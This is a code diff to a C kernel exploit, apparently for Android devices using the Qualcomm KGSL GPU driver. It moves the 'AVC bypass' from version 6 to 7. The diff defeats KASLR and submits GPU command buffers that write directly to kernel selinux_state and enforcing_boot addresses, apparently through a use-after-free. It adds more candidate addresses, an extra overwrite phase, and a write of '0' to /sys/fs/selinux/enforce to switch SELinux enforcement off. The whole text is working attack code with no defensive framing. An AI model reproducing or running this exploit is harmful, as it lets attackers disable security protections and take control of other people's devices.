@@ -140,7 +140,9 @@ uint64_t get_kaslr_offset(void) {
     munmap(buf, mmap_size);
     close(fd);
     if (!first_ip) return 0;
-    int64_t kaslr = (int64_t)((first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL);
+
+    int64_t kaslr = (int64_t)(first_ip - VMLINUX_TEXT);
+    kaslr &= ~0x1FFFFFLL;
     return (uint64_t)kaslr;
 }
 
@@ -210,17 +212,18 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] AVC bypass v6 (with SELinux state patching)\n");
+    printf("[+] AVC bypass v7 (with SELinux state patching)\n");
 
     uint64_t kaslr = get_kaslr_offset();
     if (!kaslr) {
-        printf("[-] KASLR detection failed, using hardcoded offset fallback\n");
+        printf("[-] KASLR detection failed, using fallback\n");
         kaslr = 0x1a400000;
     }
-    uint64_t selinux_state_addr = VMLINUX_SELINUX_STATE + kaslr;
-    uint64_t enforcing_boot_addr = VMLINUX_SELINUX_ENFORCING_BOOT + kaslr;
-    printf("[*] KASLR offset: 0x%lx, selinux_state: 0x%lx, enforcing_boot: 0x%lx\n",
-           (unsigned long)kaslr, (unsigned long)selinux_state_addr, (unsigned long)enforcing_boot_addr);
+    int64_t kaslr_signed = (int64_t)kaslr;
+    uint64_t selinux_state_addr = VMLINUX_SELINUX_STATE + kaslr_signed;
+    uint64_t enforcing_boot_addr = VMLINUX_SELINUX_ENFORCING_BOOT + kaslr_signed;
+    printf("[*] KASLR offset: %ld (0x%lx), selinux_state: 0x%lx, enforcing_boot: 0x%lx\n",
+           kaslr_signed, (unsigned long)kaslr, (unsigned long)selinux_state_addr, (unsigned long)enforcing_boot_addr);
 
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
@@ -403,8 +406,18 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
         uint64_t candidates[] = {
+            selinux_state_addr + 0x0,
+            selinux_state_addr + 0x1,
+            selinux_state_addr + 0x2,
+            selinux_state_addr + 0x3,
             selinux_state_addr + 0x4,
+            selinux_state_addr + 0x5,
+            selinux_state_addr + 0x6,
+            selinux_state_addr + 0x7,
             selinux_state_addr + 0x8,
+            selinux_state_addr + 0x9,
+            selinux_state_addr + 0xa,
+            selinux_state_addr + 0xb,
             selinux_state_addr + 0xc,
             selinux_state_addr + 0x10,
             selinux_state_addr + 0x14,
@@ -412,6 +425,9 @@ int main(int argc, char **argv) {
             selinux_state_addr + 0x1c,
             selinux_state_addr + 0x20,
             enforcing_boot_addr,
+            enforcing_boot_addr + 0x1,
+            enforcing_boot_addr + 0x2,
+            enforcing_boot_addr + 0x3,
             enforcing_boot_addr + 0x4
         };
         for (int i = 0; i < sizeof(candidates)/sizeof(uint64_t); i++) {
@@ -427,9 +443,31 @@ int main(int argc, char **argv) {
         unsigned int ts;
         if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx, ts);
+        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
     }
 
-    flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+    printf("[*] Phase 7c: Additional direct write to selinux_state + 0x0 as u64\n");
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        uint64_t addr = selinux_state_addr;
+        uint32_t al, ah;
+        split64(addr, &al, &ah);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
+        cmd[dw++] = al;
+        cmd[dw++] = ah;
+        cmd[dw++] = 0;
+        cmd[dw++] = 0;
+        cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+    }
 
     printf("[*] Phase 8: Signal all children to setenforce 0\n");
     for (int i = 0; i < N_AVC_CHILD; i++) write(setenforce_pipe[1], "S", 1);
@@ -448,6 +486,11 @@ int main(int argc, char **argv) {
                 success = 1;
                 break;
             }
+        }
+        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+        if (fd >= 0) {
+            if (write(fd, "0", 1) == 1) success = 1;
+            close(fd);
         }
         if (!success) {
             usleep(100000);
